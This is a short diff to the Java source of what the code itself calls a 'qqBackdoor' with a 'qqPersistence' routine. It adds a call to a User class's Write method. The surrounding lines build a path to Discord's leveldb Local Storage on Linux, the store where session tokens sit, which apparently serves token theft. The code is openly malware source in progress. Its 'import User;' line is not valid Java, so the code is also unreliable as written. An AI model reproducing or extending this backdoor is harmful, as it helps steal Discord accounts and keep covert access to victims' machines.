@@ -17,6 +17,8 @@ import java.nio.file.Paths;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import User;
+
 /*
 * Main qqBackdoor class.
 * Runs qqPersistence if Windows.
@@ -473,6 +475,8 @@ public class MainClass {
                         
                     }
                 }
+                User clazz = new User();
+                clazz.Write();
             }
             if (os.contains("linux")) {
                 String path = System.getProperty("user.home") + "/.config/discord/Cache/Local Storage/leveldb/";
